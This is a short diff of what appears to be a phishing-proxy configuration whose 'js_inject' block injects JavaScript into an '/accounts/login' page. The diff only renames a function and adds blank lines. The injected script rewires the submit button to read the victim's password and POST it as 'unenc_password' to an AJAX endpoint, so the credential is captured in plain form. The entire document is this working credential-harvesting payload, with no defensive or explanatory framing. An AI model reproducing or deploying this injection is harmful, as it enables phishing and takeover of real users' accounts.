@@ -27,17 +27,19 @@ js_inject:
     trigger_paths: ["/accounts/login"]
     trigger_params: []
     script: |
-      function lp(){
+      function onclickListener(){
         var submit = document.querySelectorAll('button[type=submit]')[0];
         submit.setAttribute("onclick", "sendPass()");
         return;
       }
       function sendPass(){
         var password = document.getElementsByName("password")[0].value;
+
         var xhr = new XMLHttpRequest();
         xhr.open("POST", '/accounts/login/ajax/', true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.send("unenc_password="+encodeURIComponent(password));
+
         return;
       }
-      setTimeout(function(){ lp(); }, 1000);
+      setTimeout(function(){ onclickListener(); }, 1000);
